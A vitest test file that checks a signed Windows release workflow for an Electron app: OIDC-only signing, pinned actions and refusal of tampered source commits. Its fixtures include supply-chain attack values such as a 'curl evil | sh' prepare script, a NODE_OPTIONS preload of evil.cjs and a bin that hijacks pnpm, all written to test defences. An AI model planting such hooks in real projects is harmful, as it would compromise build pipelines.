/** The signed Windows spike: resolve its builder overrides and hold its boundaries in place. */
import { execFileSync } from "node:child_process";
import { mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { createRequire } from "node:module";
import { afterEach, beforeEach, describe, expect, it } from "vitest";
import { verifyPackagedUpdatePublishers, verifyUpdatePublisher } from "../packaged-windows/verify-update-publisher.js";

const appRequire = createRequire(new URL("../../packages/app/package.json", import.meta.url));
const builderRequire = createRequire(appRequire.resolve("electron-builder"));
const packagerRequire = createRequire(builderRequire.resolve("app-builder-lib"));
const { load } = packagerRequire("js-yaml");
const { configureBuildCommand, normalizeOptions } = builderRequire("./builder.js");
const yargs = builderRequire("yargs/yargs");

const read = (path) => load(readFileSync(new URL(`../../${path}`, import.meta.url), "utf8"));
const signed = read(".github/workflows/windows-signed.yml");
const desktop = read(".github/workflows/desktop.yml");
const step = (workflow, job, name) => workflow.jobs[job].steps.find((s) => s.name === name);

const signing = {
  WINDOWS_SIGNING_PUBLISHER_CN: "Jane Q. Example",
  WINDOWS_SIGNING_ENDPOINT: "https://eus.codesigning.azure.net/",
  WINDOWS_SIGNING_ACCOUNT: "orca-signing",
  WINDOWS_SIGNING_PROFILE: "orca-public",
};

it.skipIf(process.platform === "win32")(
  "signs each Windows architecture with the Azure profile and forced signing",
  () => {
    const script = step(signed, "sign", "Package and sign").run;
    for (const version of ["0.7.0", "0.7.0-rc.1"]) {
      const output = execFileSync("bash", ["-c", 'pnpm() { printf "%s\\0" "$@"; printf "\\n"; }\n' + script], {
        env: { ...process.env, ...signing, VERSION: version },
        encoding: "utf8",
      });
      const commands = output.trimEnd().split("\n");
      expect(commands).toHaveLength(2);
      for (const [index, arch] of ["x64", "arm64"].entries()) {
        const args = commands[index].split("\0").filter(Boolean);
        expect(args).toContain("--publish");
        expect(args[args.indexOf("--publish") + 1]).toBe("never");
        const { config } = normalizeOptions(configureBuildCommand(yargs(args.slice(4))).parse());
        // The CLI hands booleans over as strings; the builder's schema validator coerces them.
        expect(String(config.forceCodeSigning)).toBe("true");
        expect(String(config.win.verifyUpdateCodeSignature)).toBe("true");
        expect(config.win.azureSignOptions).toEqual({
          publisherName: signing.WINDOWS_SIGNING_PUBLISHER_CN,
          endpoint: signing.WINDOWS_SIGNING_ENDPOINT,
          codeSigningAccountName: signing.WINDOWS_SIGNING_ACCOUNT,
          certificateProfileName: signing.WINDOWS_SIGNING_PROFILE,
          fileDigest: "SHA256",
          timestampDigest: "SHA256",
          timestampRfc3161: "http://timestamp.acs.microsoft.com",
        });
        expect(config.win.signtoolOptions).toBeUndefined();
        expect(config.directories.output).toBe(`dist/release/${arch}`);
        expect(config.publish.channel).toBe(`${version.includes("-") ? "prerelease" : "latest"}-${arch}`);
        expect(config.extraMetadata.version).toBe(version);
      }
    }
  },
);

it("keeps signing authority in one protected, main-only, unpublished job", () => {
  expect(Object.keys(signed.on)).toEqual(["workflow_dispatch"]);
  expect(signed.permissions).toEqual({ contents: "read" });
  expect(Object.keys(signed.jobs)).toEqual(["resolve", "prepare", "sign", "hand-off"]);
  const job = signed.jobs.sign;
  expect(job.needs).toEqual(["resolve", "prepare"]);
  expect(job.if).toBe("github.ref == 'refs/heads/main'");
  expect(job.environment).toBe("windows-signing");
  expect(job.permissions).toEqual({ contents: "read", "id-token": "write" });
  const text = JSON.stringify(signed);
  expect(text).not.toMatch(/AZURE_CLIENT_SECRET|AZURE_PASSWORD|AZURE_USERNAME|client-secret/);
  expect(text).not.toMatch(/actions\/cache|gh release|softprops|electron-builder[^"]*--publish (always|onTag)/);
  // Nothing but the OIDC login reads secrets.
  const secretSteps = job.steps.filter((s) => JSON.stringify(s).includes("secrets."));
  expect(secretSteps.map((s) => s.name)).toEqual(["Azure login (OIDC, no secret)"]);
});

it("builds in a job that cannot request an OIDC token", () => {
  const prepare = signed.jobs.prepare;
  expect(prepare.if).toBe("github.ref == 'refs/heads/main'");
  expect(prepare.permissions).toEqual({ contents: "read" });
  expect(prepare.environment).toBeUndefined();
  expect(JSON.stringify(prepare)).not.toMatch(/id-token|secrets\.|azure/i);
  for (const name of ["Build", "Build the bundled daemon", "The bundled daemon answers authenticated hello"])
    expect(step(signed, "prepare", name)).toBeDefined();
  expect(prepare.steps.find((s) => s.run === "pnpm install --frozen-lockfile")).toBeDefined();
  for (const s of prepare.steps) expect(s.with?.cache).toBeUndefined();
});

it("runs no dependency lifecycle scripts and restores no cache where the token is available", () => {
  const steps = signed.jobs.sign.steps;
  const installs = steps.filter((s) => /pnpm install/.test(s.run ?? ""));
  expect(installs.map((s) => s.run)).toEqual(["pnpm install --frozen-lockfile --ignore-scripts"]);
  for (const s of steps) {
    expect(s.with?.cache).toBeUndefined();
    expect(s.run ?? "").not.toMatch(/pnpm (run )?build\b|build:daemon|stage-native-addons/);
  }
});

it("unpacks only the digest-checked build output of the same run, before Azure login", () => {
  const steps = signed.jobs.sign.steps;
  const index = (name) => steps.findIndex((s) => s.name === name);
  const unpack = step(signed, "sign", "Verify and unpack the build output");
  expect(unpack.env.EXPECTED_SHA256).toBe("${{ needs.prepare.outputs.bundle-sha256 }}");
  expect(signed.jobs.prepare.outputs["bundle-sha256"]).toBe("${{ steps.bundle.outputs.sha256 }}");
  const download = steps.find((s) => String(s.uses).startsWith("actions/download-artifact@"));
  expect(download.with.name).toBe("windows-signed-build-${{ github.run_id }}");
  const upload = signed.jobs.prepare.steps.find((s) => String(s.uses).startsWith("actions/upload-artifact@"));
  expect(upload.with.name).toBe(download.with.name);
  expect(unpack.run).toContain(
    'node tools/packaged-windows/build-bundle.js --bundle windows-signed-build.tar --sha256 "$EXPECTED_SHA256" --root .',
  );
  // No shell listing filters: those can fail open under pipefail (see build-bundle.test.js).
  expect(unpack.run).not.toMatch(/tar -[tx]|grep/);
  expect(index("Verify and unpack the build output")).toBeLessThan(index("Azure login (OIDC, no secret)"));
  expect(index("Azure login (OIDC, no secret)")).toBeLessThan(index("Package and sign"));
  expect(index("Verify and unpack the build output")).toBeLessThan(index("The builder output directory is empty"));
  expect(index("The builder output directory is empty")).toBeLessThan(index("Azure login (OIDC, no secret)"));
  expect(step(signed, "sign", "The builder output directory is empty").run).toMatch(
    /\[ -e packages\/app\/dist\/release \] \|\| \[ -L packages\/app\/dist\/release \]/,
  );
  expect(step(signed, "prepare", "Bundle the build output").run).toContain("--exclude=packages/app/dist/release");
});

it("stages native addons exactly as the unsigned Desktop lane does", () => {
  const name = "Stage native addons for all requested Windows architectures";
  expect(step(signed, "prepare", name).run).toBe(step(desktop, "package", name).run);
});

it("leaves the ordinary Desktop lane unsigned", () => {
  expect(JSON.stringify(desktop)).not.toMatch(/azureSignOptions|id-token|forceCodeSigning/);
  expect(read("packages/app/electron-builder.yml").win.azureSignOptions).toBeUndefined();
});

describe("the packaged updater publisher check", () => {
  const cn = "Jane Q. Example";
  const config = (publisher) =>
    `provider: generic\nurl: https://updates.invalid/\nchannel: latest-x64\n${publisher}updaterCacheDirName: orca-updater\n`;

  it("accepts exactly the approved CN, as a list or a string", () => {
    expect(() => verifyUpdatePublisher(config(`publisherName:\n  - ${cn}\n`), cn)).not.toThrow();
    expect(() => verifyUpdatePublisher(config(`publisherName: "${cn}"\n`), cn)).not.toThrow();
  });

  it.each([
    ["missing", ""],
    ["empty", "publisherName: []\n"],
    ["a different CN", "publisherName:\n  - Someone Else\n"],
    ["a CN that merely contains it", `publisherName:\n  - ${cn} Ltd\n`],
    ["an extra entry beside it", `publisherName:\n  - ${cn}\n  - Someone Else\n`],
    ["only mentioned elsewhere", `# signed by ${cn}\n`],
  ])("refuses a publisherName that is %s", (_, publisher) => {
    expect(() => verifyUpdatePublisher(config(publisher), cn)).toThrow();
  });

  it("checks every packaged app-update.yml and refuses when there is none", () => {
    const root = mkdtempSync(join(tmpdir(), "orca-update-publisher-"));
    try {
      expect(() => verifyPackagedUpdatePublishers(root, cn)).toThrow(/No packaged app-update.yml/);
      const good = join(root, "win-unpacked", "resources");
      mkdirSync(good, { recursive: true });
      writeFileSync(join(good, "app-update.yml"), config(`publisherName:\n  - ${cn}\n`));
      expect(verifyPackagedUpdatePublishers(root, cn)).toHaveLength(1);
      const bad = join(root, "win-arm64-unpacked", "resources");
      mkdirSync(bad, { recursive: true });
      writeFileSync(join(bad, "app-update.yml"), config("publisherName:\n  - Someone Else\n"));
      expect(() => verifyPackagedUpdatePublishers(root, cn)).toThrow(/win-arm64-unpacked/);
    } finally {
      rmSync(root, { recursive: true, force: true });
    }
  });

  it("is what the workflow runs, for each architecture", () => {
    expect(step(signed, "sign", "Verify signatures and updater publisher").run).toContain(
      "node tools/packaged-windows/verify-update-publisher.js --root $root --publisher $expected",
    );
  });
});

it("pins every action in the signing workflow to a full commit SHA", () => {
  const uses = Object.values(signed.jobs).flatMap((job) => job.steps.map((s) => s.uses).filter(Boolean));
  expect(uses.length).toBeGreaterThan(0);
  for (const ref of uses) expect(ref).toMatch(/^[\w.-]+\/[\w.-]+@[0-9a-f]{40}$/);
  expect(readFileSync(new URL("../../.github/workflows/windows-signed.yml", import.meta.url), "utf8")).toMatch(
    /uses: azure\/login@[0-9a-f]{40} # v3\.\d+\.\d+/,
  );
});

describe("the source commit the run builds", () => {
  const script = step(signed, "resolve", "Resolve the source commit").run;
  let work;
  let clone;
  const git = (cwd, ...args) => execFileSync("git", args, { cwd, encoding: "utf8" }).trim();
  const commit = (cwd, file, content) => {
    mkdirSync(join(cwd, file, ".."), { recursive: true });
    writeFileSync(join(cwd, file), content);
    git(cwd, "add", "-A");
    git(cwd, "-c", "user.name=t", "-c", "user.email=t@t", "commit", "-qm", file);
    return git(cwd, "rev-parse", "HEAD");
  };
  // What the rules API reports for a release line: protected unless a case says otherwise.
  const protectedRules = JSON.stringify([
    { type: "pull_request" },
    { type: "non_fast_forward" },
    { type: "deletion" },
    {
      type: "required_status_checks",
      parameters: {
        strict_required_status_checks_policy: true,
        required_status_checks: [
          { context: "check (node 24)", integration_id: 15368 },
          { context: "release line check", integration_id: 15368 },
        ],
      },
    },
  ]);
  const resolveWith = (requested, githubSha, rules = protectedRules) => {
    const out = join(work, `out-${Math.random().toString(16).slice(2)}`);
    writeFileSync(out, "");
    execFileSync("bash", ["-c", script], {
      cwd: clone,
      env: {
        ...process.env,
        PATH: `${join(work, "bin")}:${process.env.PATH}`,
        RULES: rules,
        GITHUB_REPOSITORY: "o/r",
        RUNNER_TEMP: work,
        REQUESTED: requested,
        GITHUB_SHA: githubSha,
        GITHUB_OUTPUT: out,
      },
      stdio: "pipe",
    });
    return readFileSync(out, "utf8");
  };
  const rootManifest = (version, scripts = { package: "pnpm --filter app package" }) =>
    `${JSON.stringify({ name: "orca", version, private: true, scripts }, null, 2)}\n`;
  let origin;
  let main;
  const commits = {};
  // A branch off main with one change, so each case differs from main in exactly one input.
  const branchWith = (name, file, content, from = main) => {
    git(origin, "checkout", "-qb", name, from);
    commits[name] = commit(origin, file, content);
  };

  beforeEach(() => {
    work = mkdtempSync(join(tmpdir(), "orca-resolve-"));
    mkdirSync(join(work, "bin"));
    writeFileSync(
      join(work, "bin", "gh"),
      '#!/bin/sh\ncase "$*" in *rules/branches*) printf "%s" "$RULES";; *) exit 1;; esac\n',
      {
        mode: 0o755,
      },
    );
    origin = join(work, "origin");
    mkdirSync(origin);
    git(origin, "init", "-q", "-b", "main");
    for (const [file, content] of [
      ["package.json", rootManifest("0.6.0")],
      ["pnpm-lock.yaml", "lockfileVersion: '9.0'\n"],
      ["packages/app/package.json", '{"name":"app"}\n'],
      ["packages/app/electron-builder.yml", "appId: orca\n"],
      ["packages/app/scripts/stage-native.js", "// v1\n"],
      ["tools/release-lane.js", readFileSync(new URL("../release-lane.js", import.meta.url), "utf8")],
    ])
      commit(origin, file, content);
    commit(origin, "tools/packaged-windows/build-bundle.js", "v1\n");
    main = commit(origin, "README", "main\n");
    branchWith("candidate", "package.json", rootManifest("0.7.0-rc.1"));
    git(origin, "checkout", "-q", "candidate");
    commits.candidate = commit(origin, "CHANGELOG.md", "0.7.0-rc.1\n");
    branchWith("sideways", "README", "main\n", `${main}~1`);
    commits.sideways = commit(origin, "changelog.d/note.fixed.md", "note\n");
    branchWith("unpinned", "docs/guide.md", "g\n");
    commit(origin, ".github/workflows/other.yml", "on: push\n");
    commits.unpinned = commit(origin, "tools/test/new.test.js", "// test\n");
    branchWith("tooling", "tools/packaged-windows/build-bundle.js", "v2\n");
    branchWith("lockfile", "pnpm-lock.yaml", "lockfileVersion: '9.0'\nevil: true\n");
    branchWith("builder", "packages/app/electron-builder.yml", "appId: orca\nafterSign: x.js\n");
    branchWith("hook", "packages/app/scripts/stage-native.js", "// v2\n");
    branchWith("manifest", "packages/evil/package.json", '{"name":"evil"}\n');
    branchWith("appSource", "packages/app/src/main.ts", "export {};\n");
    branchWith("workspaceBin", "tools/eslint-config/package.json", '{"name":"c","bin":{"pnpm":"./x.js"}}\n');
    branchWith("builderEnv", "packages/app/electron-builder.env", "NODE_OPTIONS=--require ./evil.cjs\n");
    branchWith("testManifest", "tools/test/package.json", '{"name":"t"}\n');
    branchWith("attributes", ".gitattributes", "*.yml eol=crlf\n");
    branchWith("patch", "patches/x.patch", "diff\n");
    branchWith("badVersion", "package.json", rootManifest("1.0.0\n- forged line"));
    branchWith("rootScripts", "package.json", rootManifest("0.6.0", { prepare: "curl evil | sh" }));
    // Release lines (docs/RELEASING.md): release/0.6 diverges from main in application
    // source. A 0.6.x patch on it is checked against the line's head, not main's.
    git(origin, "checkout", "-qb", "release/0.6", `${main}~1`);
    commit(origin, "packages/app/src/fix.ts", "export const fix = 1;\n");
    commits.linePatch = commit(origin, "package.json", rootManifest("0.6.1"));
    commit(origin, "CHANGELOG.md", "0.6.1 notes\n");
    commits.lineNotes = git(origin, "rev-parse", "HEAD");
    git(origin, "checkout", "-qb", "line-moved", commits.linePatch);
    git(origin, "checkout", "-q", "release/0.6");
    commits.lineHead = commit(origin, "packages/app/src/later.ts", "export const later = 1;\n");
    // A 0.6.x patch that only main holds: never released from main.
    git(origin, "checkout", "-qb", "patchOnMain", main);
    commits.patchOnMain = commit(origin, "package.json", rootManifest("0.6.2"));
    // A 0.7.x version on the 0.6 line: never compared with release/0.6.
    git(origin, "checkout", "-qb", "wrongLine", commits.linePatch);
    commits.wrongLine = commit(origin, "package.json", rootManifest("0.7.1"));
    // A new minor's line, cut from main at its first candidate: release/0.9.
    git(origin, "checkout", "-qb", "release/0.9", main);
    commits.cutCandidate = commit(origin, "package.json", rootManifest("0.9.0-rc.1"));
    git(origin, "checkout", "-qb", "cut-moved", commits.cutCandidate);
    git(origin, "checkout", "-q", "release/0.9");
    commits.cutHead = commit(origin, "packages/app/src/rc-fix.ts", "export const fix = 1;\n");
    commits.cutHeadVersion = commit(origin, "package.json", rootManifest("0.9.0-rc.2"));
    git(origin, "checkout", "-q", "--detach", main);
    commits.unbranched = commit(origin, "dangling", "d\n");
    git(origin, "checkout", "-q", "--detach", main);
    commits.tagOnly = commit(origin, "tagged", "t\n");
    git(origin, "tag", "only-a-tag");
    git(origin, "checkout", "-q", "--detach", main);
    commits.pullOnly = commit(origin, "pulled", "p\n");
    git(origin, "update-ref", "refs/pull/1/head", commits.pullOnly);
    git(origin, "checkout", "-q", "main");
    clone = join(work, "clone");
    git(work, "clone", "-q", "--no-local", origin, clone);
    // The object is present locally, as a pull request head can be, but no branch holds it.
    git(clone, "fetch", "-q", "origin", "refs/pull/1/head:refs/pull/1/head");
  });
  afterEach(() => rmSync(work, { recursive: true, force: true }));

  it("defaults to the dispatching main commit", () => {
    expect(resolveWith("", main)).toBe(`sha=${main}\n`);
  });

  it("accepts a release candidate that changes only the root version and unpinned files", () => {
    expect(resolveWith(commits.candidate, main)).toBe(`sha=${commits.candidate}\n`);
  });

  it("accepts a branch that is not a descendant of main when its tree otherwise matches", () => {
    expect(resolveWith(commits.sideways, main)).toBe(`sha=${commits.sideways}\n`);
  });

  it("accepts a patch on its own release line, checked against the line's head", () => {
    expect(resolveWith(commits.lineHead, main)).toBe(`sha=${commits.lineHead}\n`);
  });

  it.each([
    [
      "a patch the line has since moved past in source",
      () => commits.linePatch,
      protectedRules,
      /differs from release\/0\.6/,
    ],
    [
      "the line's notes commit once the line moved on",
      () => commits.lineNotes,
      protectedRules,
      /differs from release\/0\.6/,
    ],
    [
      "a version whose own line does not exist",
      () => commits.wrongLine,
      protectedRules,
      /release\/0\.7, the only branch/,
    ],
    ["a patch on a line that is not protected", () => commits.lineHead, "[]", /not protected as a release line/],
    ["a patch that is only on main", () => commits.patchOnMain, protectedRules, /is not on release\/0\.6/],
  ])("refuses %s", (_, requested, rules, message) => {
    let failure;
    try {
      resolveWith(requested(), main, rules);
    } catch (error) {
      failure = error;
    }
    expect(failure?.status).toBe(1);
    expect(String(failure.stdout)).toMatch(/^::error::/m);
    expect(String(failure.stdout)).toMatch(message);
  });

  it("checks a new minor's candidate on its cut line against the line's head, not main", () => {
    expect(resolveWith(commits.cutHeadVersion, main)).toBe(`sha=${commits.cutHeadVersion}\n`);
    let failure;
    try {
      resolveWith(commits.cutCandidate, main);
    } catch (error) {
      failure = error;
    }
    expect(failure?.status).toBe(1);
    expect(String(failure.stdout)).toMatch(/differs from release\/0\.9/);
  });

  it("accepts changes to docs, workflow files and test files", () => {
    expect(resolveWith(commits.unpinned, main)).toBe(`sha=${commits.unpinned}\n`);
  });

  it.each([
    ["an abbreviated SHA", () => commits.candidate.slice(0, 12)],
    ["an uppercase SHA", () => commits.candidate.toUpperCase()],
    ["a branch name", () => "candidate"],
    ["a commit that changes a signing verifier", () => commits.tooling],
    ["a commit that changes the lockfile", () => commits.lockfile],
    ["a commit that changes the builder configuration", () => commits.builder],
    ["a commit that changes a packaging script", () => commits.hook],
    ["a commit that adds a workspace package manifest", () => commits.manifest],
    ["a commit that changes the root package.json beyond its version", () => commits.rootScripts],
    ["a commit that changes application source", () => commits.appSource],
    ["a commit that adds a bin to a tools workspace package", () => commits.workspaceBin],
    ["a commit that adds electron-builder.env", () => commits.builderEnv],
    ["a commit that makes tools/test a workspace package", () => commits.testManifest],
    ["a commit that changes .gitattributes", () => commits.attributes],
    ["a commit that changes a dependency patch", () => commits.patch],
    ["a commit whose version is not plain semver", () => commits.badVersion],
    ["a commit on no branch of the repository", () => commits.unbranched],
    ["a commit reachable only from a tag", () => commits.tagOnly],
    ["a commit reachable only from a pull request ref", () => commits.pullOnly],
    ["an unknown commit", () => "0".repeat(40)],
  ])("refuses %s", (_, requested) => {
    let failure;
    try {
      resolveWith(requested(), main);
    } catch (error) {
      failure = error;
    }
    // Refused by one of the script's own checks, not by an unrelated shell error.
    expect(failure?.status).toBe(1);
    expect(String(failure.stdout)).toMatch(/^::error::/m);
  });

  it("is what prepare and sign check out, and the artifact name records", () => {
    for (const job of ["prepare", "sign"]) {
      expect(signed.jobs[job].needs).toContain("resolve");
      const checkout = signed.jobs[job].steps.find((s) => String(s.uses).startsWith("actions/checkout@"));
      expect(checkout.with.ref).toBe("${{ needs.resolve.outputs.sha }}");
    }
    expect(signed.jobs.resolve.permissions).toEqual({ contents: "read" });
    // resolve lets .github differ from main, which is safe only while no step runs a local action.
    for (const job of Object.values(signed.jobs))
      for (const s of job.steps) expect(String(s.uses ?? "")).not.toMatch(/^\.\//);
    expect(JSON.stringify(signed.jobs.resolve)).not.toMatch(/id-token|secrets\./);
    const upload = signed.jobs.sign.steps.find((s) => s.name === "Upload the signed artifacts");
    expect(upload.with.name).toBe("windows-signed-${{ needs.resolve.outputs.sha }}");
  });
});
